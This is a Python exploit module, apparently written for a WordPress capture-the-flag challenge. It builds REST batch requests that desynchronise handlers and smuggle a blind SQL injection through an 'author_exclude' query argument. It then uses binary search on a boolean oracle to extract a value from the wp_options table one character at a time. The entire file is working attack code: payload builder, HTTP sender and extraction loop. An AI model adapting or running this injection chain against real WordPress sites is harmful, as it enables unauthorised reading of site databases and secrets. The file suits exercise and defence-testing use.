"""Exploit-side HTTP helpers for wp2shell.

The useful primitive is a blind SQL injection in the REST posts collection
query. The REST controller asks `WP_Query` for post IDs, so a UNION row does not
come back as JSON. Instead, the exploit asks boolean questions and observes
whether the posts list returns any rows.

The request still goes through the intended batch desync:

  index 0 -- malformed path, creating the `$requests` / `$matches` offset
  index 1 -- widgets request carrying an unsanitized `author_exclude` query arg
  index 2 -- posts request donating the public posts-list GET handler

The vulnerable image widens `/batch/v1` to allow GET subrequests. Without that
challenge-side vulnerable surface, stock WordPress rejects GET during the batch
schema check before the desync can reach the posts-list handler.
"""
from __future__ import annotations

import http.client
import json
import string
import urllib.parse

MALFORMED_PATH = ":"
CARRIER_PATH = "/wp/v2/widgets"
DONOR_PATH = "/wp/v2/posts"

FLAG_PREFIX = "FLAG{"
FLAG_BODY_LEN = 32
FLAG_SUFFIX = "}"
FLAG_BODY_ALPHABET = string.ascii_uppercase + string.digits


def _sql_string(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _base_parts(base_url: str) -> tuple[str, int, str]:
    if "://" not in base_url:
        base_url = "http://" + base_url
    parsed = urllib.parse.urlsplit(base_url)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError(f"unsupported base URL: {base_url!r}")
    port = parsed.port or 80
    prefix = parsed.path.rstrip("/")
    return parsed.hostname, port, prefix


def build_batch_payload(predicate: str) -> dict:
    injection = f"0) AND ({predicate})-- -"
    query = urllib.parse.urlencode({"author_exclude": injection})
    return {
        "validation": "normal",
        "requests": [
            {"path": MALFORMED_PATH, "method": "GET"},
            {"path": f"{CARRIER_PATH}?{query}", "method": "GET"},
            {"path": DONOR_PATH, "method": "GET"},
        ],
    }


def _post_batch(base_url: str, payload: dict, *, timeout: float) -> dict | None:
    host, port, prefix = _base_parts(base_url)
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(
            "POST",
            f"{prefix}/wp-json/batch/v1",
            body=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        resp = conn.getresponse()
        raw = resp.read().decode("utf-8", errors="replace")
    finally:
        conn.close()
    try:
        obj = json.loads(raw)
    except json.JSONDecodeError:
        return None
    return obj if isinstance(obj, dict) else None


def _probe(base_url: str, predicate: str, *, timeout: float) -> bool:
    obj = _post_batch(base_url, build_batch_payload(predicate), timeout=timeout)
    responses = obj.get("responses") if isinstance(obj, dict) else None
    if not isinstance(responses, list) or len(responses) < 2:
        return False
    carried = responses[1]
    if not isinstance(carried, dict) or carried.get("status") != 200:
        return False
    headers = carried.get("headers") if isinstance(carried.get("headers"), dict) else {}
    try:
        return int(headers.get("X-WP-Total") or 0) > 0
    except (TypeError, ValueError):
        body = carried.get("body")
        return isinstance(body, list) and len(body) > 0


def _ascii_le_predicate(option_name: str, position: int, value: int) -> str:
    option = _sql_string(option_name)
    return (
        "ASCII(SUBSTRING("
        f"(SELECT option_value FROM wp_options WHERE option_name={option}),"
        f"{position},1))<={value}"
    )


def _recover_char(base_url: str, option_name: str, position: int,
                  *, timeout: float) -> str | None:
    lo, hi = 48, 90
    while lo < hi:
        mid = (lo + hi) // 2
        if _probe(base_url, _ascii_le_predicate(option_name, position, mid),
                  timeout=timeout):
            hi = mid
        else:
            lo = mid + 1
    ch = chr(lo)
    return ch if ch in FLAG_BODY_ALPHABET else None


def steal_option(base_url: str, option_name: str, *, timeout: float = 8.0) -> str | None:
    """Blind-read the standard CyberArena flag from `wp_options`.

    Returns None when the target is reachable but the oracle is unavailable,
    which is the expected result after a defender fixes either half of the
    chain.
    """
    if not _probe(base_url, "1=1", timeout=timeout):
        return None
    if _probe(base_url, "1=0", timeout=timeout):
        return None

    body = []
    start = len(FLAG_PREFIX) + 1
    stop = start + FLAG_BODY_LEN
    for position in range(start, stop):
        ch = _recover_char(base_url, option_name, position, timeout=timeout)
        if ch is None:
            return None
        body.append(ch)
    return f"{FLAG_PREFIX}{''.join(body)}{FLAG_SUFFIX}"
